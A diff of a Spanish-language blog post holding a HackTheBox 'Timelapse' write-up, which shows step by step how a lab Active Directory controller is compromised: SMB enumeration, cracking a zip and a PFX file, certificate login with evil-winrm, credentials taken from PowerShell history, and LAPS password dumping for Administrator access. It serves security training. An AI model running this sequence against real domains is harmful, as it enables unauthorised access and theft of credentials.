@@ -1,309 +1,22 @@
-<!doctype html>
-<!--
-  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
-  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
-  Free for personal and commercial use under the MIT license
-  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
--->
-<html lang="en" class="no-js">
-  <head>
-    <meta charset="utf-8">
-
-<!-- begin _includes/seo.html --><title>HTB timelapse AD - Bast1ant1c</title>
-<meta name="description" content="Vamos a resolver la máquina timelapse AD de HackTheBox. ¡Let’s hack!">
-
-
-
-<meta property="og:type" content="article">
-<meta property="og:locale" content="en_US">
-<meta property="og:site_name" content="Bast1ant1c">
-<meta property="og:title" content="HTB timelapse AD">
-<meta property="og:url" content="http://localhost:4000/timelapse/">
-
-
-  <meta property="og:description" content="Vamos a resolver la máquina timelapse AD de HackTheBox. ¡Let’s hack!">
-
-
-
-  <meta property="og:image" content="http://localhost:4000/assets/images/timelapse/01-inicio.png">
-
-
-
-
-
-  <meta property="article:published_time" content="2023-02-01T00:00:00-05:00">
-
-
-
-
-
-  
-
-  
-
-
-<link rel="canonical" href="http://localhost:4000/timelapse/">
-
-
-
-
-
-
-
-  <script type="application/ld+json">
-    {
-      "@context": "https://schema.org",
-      "@type": "Person",
-      "name": "Bast1ant1c",
-      "url": "http://localhost:4000",
-      "sameAs": null
-    }
-  </script>
-
-
-
-
-
-
-
-<!-- end _includes/seo.html -->
-
-
-<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Bast1ant1c Feed">
-
-<!-- https://t.co/dKP3o1e -->
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<script>
-  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
-</script>
-
-<!-- For all browsers -->
-<link rel="stylesheet" href="/assets/css/main.css">
-
-<!--[if IE ]>
-  <style>
-    /* old IE unsupported flexbox fixes */
-    .greedy-nav .site-title {
-      padding-right: 3em;
-    }
-    .greedy-nav button {
-      position: absolute;
-      top: 0;
-      right: 0;
-      height: 100%;
-    }
-  </style>
-<![endif]-->
-
-
-
-    <!-- start custom head snippets -->
-
-<!-- insert favicons. use https://realfavicongenerator.net/ -->
-
-<!-- end custom head snippets -->
-
-  </head>
-
-  <body class="layout--single wide">
-
-    <!--[if lt IE 9]>
-<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
-<![endif]-->
-
-    
-
-<div class="masthead">
-  <div class="masthead__inner-wrap">
-    <div class="masthead__menu">
-      <nav id="site-nav" class="greedy-nav">
-                
-        <ul class="visible-links"><li class="masthead__menu-item">
-              <a href="/" >Home</a>
-            </li><li class="masthead__menu-item">
-              <a href="/year-archive/" >Blog</a>
-            </li><li class="masthead__menu-item">
-              <a href="/categories/" >Categories</a>
-            </li><li class="masthead__menu-item">
-              <a href="/tags/" >Tags</a>
-            </li><li class="masthead__menu-item">
-              <a href="/buscador/" >Buscar</a>
-            </li></ul>
-        
-        <button class="greedy-nav__toggle hidden" type="button">
-          <span class="visually-hidden">Toggle menu</span>
-          <div class="navicon"></div>
-        </button>
-        <ul class="hidden-links hidden"></ul>
-      </nav>
-    </div>
-  </div>
-</div>
-    
-
-    <div class="initial-content">
-      
-
-
-  
-    
-
-
-
-<nav class="breadcrumbs">
-  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
-    
-    
-    
-      
-        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
-          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
-          <meta itemprop="position" content="1" />
-        </li>
-        <span class="sep">/</span>
-      
-      
-        <li class="current">HTB timelapse AD</li>
-      
-    
-  </ol>
-</nav>
-
-  
-
-
-<div id="main" role="main">
-  
-  <div class="sidebar sticky">
-  
-
-
-<div itemscope itemtype="https://schema.org/Person">
-
-  
-
-  <div class="author__content">
-    
-      <h3 class="author__name" itemprop="name"></h3>
-    
-    
-  </div>
-
-  <div class="author__urls-wrapper">
-    <button class="btn btn--inverse">Follow</button>
-    <ul class="author__urls social-icons">
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      <!--
-  <li>
-    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
-      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
-    </a>
-  </li>
--->
-    </ul>
-  </div>
-</div>
-
-  
-  </div>
-
-
-  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
-    <meta itemprop="headline" content="HTB timelapse AD">
-    <meta itemprop="description" content="Vamos a resolver la máquina timelapse AD de HackTheBox. ¡Let’s hack!">
-    <meta itemprop="datePublished" content="February 01, 2023">
-    
-
-    <div class="page__inner-wrap">
-      
-        <header>
-          <h1 id="page-title" class="page__title" itemprop="headline">HTB timelapse AD
-</h1>
-          
-        </header>
-      
-
-      <section class="page__content" itemprop="text">
-        
-        <p class="page__meta">
-          
-            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2023-02-01T00:00:00-05:00">February 01, 2023 </time>&emsp;
-          
-          
-        </p>
-        <p align="center">
+<p align="center">
 <img src="/assets/images/timelapse/02-tarjeta.png" />
 </p>
 
 <p>¡Hola!
-En esta ocasión vamos a resolver de la máquina <code class="language-plaintext highlighter-rouge">timelapse</code> AD de <a href="https://hackthebox.com/">HackTheBox</a>.
+En esta ocasión vamos a resolver de la máquina <code class="highlighter-rouge">timelapse</code> AD de <a href="https://hackthebox.com/">HackTheBox</a>.
 La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!</p>
 
 <h2 id="preparación">PREPARACIÓN</h2>
 
-<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="language-plaintext highlighter-rouge">timelapse</code> y los subdirectorios <code class="language-plaintext highlighter-rouge">recon</code> junto con <code class="language-plaintext highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
+<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="highlighter-rouge">timelapse</code> y los subdirectorios <code class="highlighter-rouge">recon</code> junto con <code class="highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkhack timelapse
-<span class="nb">cd</span> <span class="o">!</span><span class="nv">$/</span>recon 
+<span class="nb">cd</span> <span class="o">!</span><span class="nv">$/</span>recon
 </code></pre></div></div>
 
 <h2 id="reconocimiento">RECONOCIMIENTO</h2>
 
-<p>Accedemos al directorio <code class="language-plaintext highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="language-plaintext highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>
+<p>Accedemos al directorio <code class="highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>osping 10.10.11.152
 </code></pre></div></div>
@@ -344,7 +57,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
 49705/tcp open  unknown
 </code></pre></div></div>
 
-<p>Luego de identificar los puertos abiertos <code class="language-plaintext highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
+<p>Luego de identificar los puertos abiertos <code class="highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p53</span>,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49168,49169 <span class="nt">-sCV</span> 10.10.11.152 <span class="nt">-oN</span> versions
 </code></pre></div></div>
@@ -380,14 +93,14 @@ Service Info: Host: DC01<span class="p">;</span> OS: Windows<span class="p">;</s
 
 <h2 id="ad-domain-detection">AD DOMAIN DETECTION</h2>
 
-<p>Iniciamos con la detección del <code class="language-plaintext highlighter-rouge">dominio</code> donde inicialmente, por medio de la utilidad <code class="language-plaintext highlighter-rouge">crackmapexec</code> enumeramos información necesaria para tener un mejor alcance a la máquina víctima.</p>
+<p>Iniciamos con la detección del <code class="highlighter-rouge">dominio</code> donde inicialmente, por medio de la utilidad <code class="highlighter-rouge">crackmapexec</code> enumeramos información necesaria para tener un mejor alcance a la máquina víctima.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.11.152
 </code></pre></div></div>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.11.152    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:timelapse.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
 </code></pre></div></div>
 
-<p>Agregamos en el archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+<p>Agregamos en el archivo <code class="highlighter-rouge">/etc/hosts</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su
 nvim /etc/hosts
@@ -418,7 +131,7 @@ SMB         10.10.11.152    445    DC01             <span class="o">[</span>-] E
 SMB1 disabled <span class="nt">--</span> no workgroup available
 </code></pre></div></div>
 
-<p>Revisamos los archivos con capacidad de lectura, encontrando <code class="language-plaintext highlighter-rouge">winrm.backup.zip</code>, el cual esta cifrado, por lo tanto descargamos este archivo en nuestra máquina.</p>
+<p>Revisamos los archivos con capacidad de lectura, encontrando <code class="highlighter-rouge">winrm.backup.zip</code>, el cual esta cifrado, por lo tanto descargamos este archivo en nuestra máquina.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //10.10.11.152/Shares <span class="nt">-N</span>
 </code></pre></div></div>
@@ -450,7 +163,7 @@ SMB1 disabled <span class="nt">--</span> no workgroup available
 
 <h2 id="decrypt-file-password">DECRYPT FILE PASSWORD</h2>
 
-<p>Vamos a proceder a crackear la contraseña del archivo <code class="language-plaintext highlighter-rouge">zip</code> con la utilidad <code class="language-plaintext highlighter-rouge">fcrackzip</code> para asi lograr evidenciar su contenido.</p>
+<p>Vamos a proceder a crackear la contraseña del archivo <code class="highlighter-rouge">zip</code> con la utilidad <code class="highlighter-rouge">fcrackzip</code> para asi lograr evidenciar su contenido.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unzip winrm_backup.zip
 </code></pre></div></div>
@@ -476,7 +189,7 @@ PASSWORD FOUND!!!!: pw <span class="o">==</span> supremelegacy
 
 <h2 id="trying-to-open-pfx-file">TRYING TO OPEN PFX FILE</h2>
 
-<p>Ahora que logramos descomprimir el archivo <code class="language-plaintext highlighter-rouge">pfx</code>, ahora con la utilidad <code class="language-plaintext highlighter-rouge">openssl</code> procedemos a obtener el hash para lograr desencriptar leer la información del archivo.</p>
+<p>Ahora que logramos descomprimir el archivo <code class="highlighter-rouge">pfx</code>, ahora con la utilidad <code class="highlighter-rouge">openssl</code> procedemos a obtener el hash para lograr desencriptar leer la información del archivo.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl pkcs12 <span class="nt">-in</span> legacyy_dev_auth.pfx <span class="nt">-nocerts</span> <span class="nt">-out</span> priv-key.pem <span class="nt">-nodes</span>
 </code></pre></div></div>
@@ -493,13 +206,13 @@ legacyy_dev_auth.pfx:<span class="nv">$pfxng$1$20$2000$20$b</span><span class="s
 
 <h2 id="crackpkcs12-install">CRACKPKCS12 INSTALL</h2>
 
-<p>Una vez obtenemos el hash, procedemos a instalar la herramienta <code class="language-plaintext highlighter-rouge">crackpkcs12</code> para crackear la contraseña del archivo <code class="language-plaintext highlighter-rouge">pfx</code>.</p>
+<p>Una vez obtenemos el hash, procedemos a instalar la herramienta <code class="highlighter-rouge">crackpkcs12</code> para crackear la contraseña del archivo <code class="highlighter-rouge">pfx</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt <span class="nb">install </span>libssl-dev<span class="p">;</span> git clone https://github.com/crackpkcs12/crackpkcs12<span class="p">;</span> <span class="nb">cd </span>crackpkcs12<span class="p">;</span> ./configure<span class="p">;</span> make<span class="p">;</span> make <span class="nb">install</span>
 </code></pre></div></div>
 <h2 id="finding-pfx-file-password-crackpkcs12">FINDING PFX FILE PASSWORD (CRACKPKCS12)</h2>
 
-<p>Procedemos a obtener el password con la utilidad previamente instalada y el diccionario de palabras <code class="language-plaintext highlighter-rouge">rockyou</code>.</p>
+<p>Procedemos a obtener el password con la utilidad previamente instalada y el diccionario de palabras <code class="highlighter-rouge">rockyou</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackpkcs12 <span class="nt">-d</span> /usr/share/wordlists/rockyou.txt ../legacyy_dev_auth.pfx
 </code></pre></div></div>
@@ -512,7 +225,7 @@ Dictionary attack - Thread 1 - Password found: thuglegacy
 
 <h2 id="opening-pfx-file">OPENING PFX FILE</h2>
 
-<p>Vamos a abrir el archivo <code class="language-plaintext highlighter-rouge">pfx</code> con la contraseña encontrada anteriormente, por lo que con <code class="language-plaintext highlighter-rouge">openssl</code> obtenemos el certificado y clave para lograr conectarnos remotamente a la máquina víctima.</p>
+<p>Vamos a abrir el archivo <code class="highlighter-rouge">pfx</code> con la contraseña encontrada anteriormente, por lo que con <code class="highlighter-rouge">openssl</code> obtenemos el certificado y clave para lograr conectarnos remotamente a la máquina víctima.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl pkcs12 <span class="nt">-in</span> legacyy_dev_auth.pfx <span class="nt">-nocerts</span> <span class="nt">-out</span> priv-key.pem <span class="nt">-nodes</span>
 </code></pre></div></div>
@@ -526,7 +239,7 @@ Dictionary attack - Thread 1 - Password found: thuglegacy
 
 <h2 id="granted-access-legacyy-user-evil-winrm-ssl">GRANTED ACCESS LEGACYY USER (EVIL-WINRM SSL)</h2>
 
-<p>Ahora tenemos lo necesario para conectarnos remotamente por medio de un certificado <code class="language-plaintext highlighter-rouge">SSL</code>, haciendo uso de la utilidad <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</p>
+<p>Ahora tenemos lo necesario para conectarnos remotamente por medio de un certificado <code class="highlighter-rouge">SSL</code>, haciendo uso de la utilidad <code class="highlighter-rouge">evil-winrm</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> &lt;IP&gt; <span class="nt">-c</span> certificate.pem <span class="nt">-k</span> priv-key.pem <span class="nt">-S</span>
 </code></pre></div></div>
@@ -647,7 +360,7 @@ get-aduser <span class="nt">-filter</span> <span class="k">*</span> <span class=
 
 <h2 id="granted-access-svc_deploy-user">GRANTED ACCESS SVC_DEPLOY USER</h2>
 
-<p>En el historial de comandos logramos ver una credencial para el usuario <code class="language-plaintext highlighter-rouge">svc_deploy</code>, asi que con <code class="language-plaintext highlighter-rouge">crackmapexec</code> vamos a validar la credencial y si es el caso, nos conectamos a la máquina víctima.</p>
+<p>En el historial de comandos logramos ver una credencial para el usuario <code class="highlighter-rouge">svc_deploy</code>, asi que con <code class="highlighter-rouge">crackmapexec</code> vamos a validar la credencial y si es el caso, nos conectamos a la máquina víctima.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.11.152 <span class="nt">-u</span> <span class="s1">'svc_deploy'</span> <span class="nt">-p</span> <span class="s1">'E3R$Q62^12p7PLlC%KWaxuaV'</span>
 </code></pre></div></div>
@@ -664,7 +377,7 @@ SMB         10.10.11.152    445    DC01             <span class="o">[</span>+] t
 
 <h2 id="sharing-get-lapspasswordsps1">SHARING GET-LAPSPASSWORDS.PS1</h2>
 
-<p>Este usuario <code class="language-plaintext highlighter-rouge">svc_deploy</code> tenia la capacidad de leer credenciales de <code class="language-plaintext highlighter-rouge">LAPS</code>, asi que vamos a aprovechar esta capacidad por medio del binario <code class="language-plaintext highlighter-rouge">Get-LAPSPasswords.ps1</code>, luego de traer el binario a nuestra máquina atacante, transmitimos este a la máquina víctima y procedemos a ejecutarlo.</p>
+<p>Este usuario <code class="highlighter-rouge">svc_deploy</code> tenia la capacidad de leer credenciales de <code class="highlighter-rouge">LAPS</code>, asi que vamos a aprovechar esta capacidad por medio del binario <code class="highlighter-rouge">Get-LAPSPasswords.ps1</code>, luego de traer el binario a nuestra máquina atacante, transmitimos este a la máquina víctima y procedemos a ejecutarlo.</p>
 
 <h4 id="máquina-atacante">MÁQUINA ATACANTE</h4>
 
@@ -691,7 +404,7 @@ Expiration : 1/21/2023 10:42:40 PM
 
 <h2 id="granted-access-administrator-user">GRANTED ACCESS ADMINISTRATOR USER</h2>
 
-<p>Tenemos la credencial del usuario <code class="language-plaintext highlighter-rouge">Administrator</code>, ahora vamos a validarlo por <code class="language-plaintext highlighter-rouge">smb</code> con la utilidad <code class="language-plaintext highlighter-rouge">crackmapexec</code> y ya obteniendo un acceso como administrador <code class="language-plaintext highlighter-rouge">Pwn3d</code>, procedemos con la utilidad <code class="language-plaintext highlighter-rouge">evil-winrm</code> a entablar una conexión directamente con la máquina víctima.</p>
+<p>Tenemos la credencial del usuario <code class="highlighter-rouge">Administrator</code>, ahora vamos a validarlo por <code class="highlighter-rouge">smb</code> con la utilidad <code class="highlighter-rouge">crackmapexec</code> y ya obteniendo un acceso como administrador <code class="highlighter-rouge">Pwn3d</code>, procedemos con la utilidad <code class="highlighter-rouge">evil-winrm</code> a entablar una conexión directamente con la máquina víctima.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.11.152 <span class="nt">-u</span> <span class="s1">'administrator'</span> <span class="nt">-p</span> <span class="s1">'82oF3(d69XO5U&amp;6zY}g!88.2'</span>
 </code></pre></div></div>
@@ -708,7 +421,7 @@ SMB         10.10.11.152    445    DC01             <span class="o">[</span>+] t
 
 <h2 id="flags">FLAGS</h2>
 
-<p>Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con <code class="language-plaintext highlighter-rouge">type</code>, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag.</p>
+<p>Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con <code class="highlighter-rouge">type</code>, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>Get-Content <span class="s2">"C:</span><span class="se">\D</span><span class="s2">ocuments and Settings</span><span class="se">\l</span><span class="s2">egacyy</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\u</span><span class="s2">ser.txt"</span><span class="o">)</span>.Substring<span class="o">(</span>0,10<span class="o">)</span>
 7fc2c03c50
@@ -718,7 +431,7 @@ SMB         10.10.11.152    445    DC01             <span class="o">[</span>+] t
 2e8419fd4a
 </code></pre></div></div>
 
-<p>¡Hemos logrado completar la máquina <code class="language-plaintext highlighter-rouge">timelapse</code> de HackTheBox!</p>
+<p>¡Hemos logrado completar la máquina <code class="highlighter-rouge">timelapse</code> de HackTheBox!</p>
 
 <p align="center">
 <img src="/assets/images/timelapse/03-finish.png" />
@@ -727,122 +440,3 @@ SMB         10.10.11.152    445    DC01             <span class="o">[</span>+] t
 <p><em>¡Que tengan un buen día en el planeta donde se encuentren!</em></p>
 
 <p><strong>Nos vemos en otro bit.</strong></p>
-
-        
-      </section>
-
-      <footer class="page__meta">
-        
-        
-  
-
-
-  
-  
-  
-
-  <p class="page__taxonomy">
-    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
-    <span itemprop="keywords">
-    
-      
-      
-      <a href="/tags/#active-directory" class="page__taxonomy-item" rel="tag">Active Directory</a><span class="sep">, </span>
-    
-      
-      
-      <a href="/tags/#timelapse" class="page__taxonomy-item" rel="tag">Timelapse</a><span class="sep">, </span>
-    
-      
-      
-      <a href="/tags/#writeup" class="page__taxonomy-item" rel="tag">Writeup</a>
-    
-    </span>
-  </p>
-
-
-
-
-  
-
-
-  
-  
-  
-
-  <p class="page__taxonomy">
-    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
-    <span itemprop="keywords">
-    
-      
-      
-      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">HackTheBox</a>
-    
-    </span>
-  </p>
-
-
-        
-          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2023-02-01T00:00:00-05:00">February 01, 2023</time></p>
-        
-      </footer>
-
-      
-
-      
-  <nav class="pagination">
-    
-      <a href="/active/" class="pagination--pager" title="HTB active AD
-">Previous</a>
-    
-    
-      <a href="#" class="pagination--pager disabled">Next</a>
-    
-  </nav>
-
-    </div>
-
-    
-  </article>
-
-  
-</div>
-
-    </div>
-
-    
-
-    <div class="page__footer">
-      <footer>
-        <!-- start custom footer snippets -->
-
-<!-- end custom footer snippets -->
-        <div class="page__footer-follow">
-  <ul class="social-icons">
-    
-
-    
-<!--
-    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
--->
-  </ul>
-</div>
-
-<div class="page__footer-copyright">&copy; 2023 Bast1ant1c</div>
-
-      </footer>
-    </div>
-
-    
-  <script src="/assets/js/main.min.js"></script>
-  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
-
-
-
-
-
-
-
-
-  </body>
-</html>
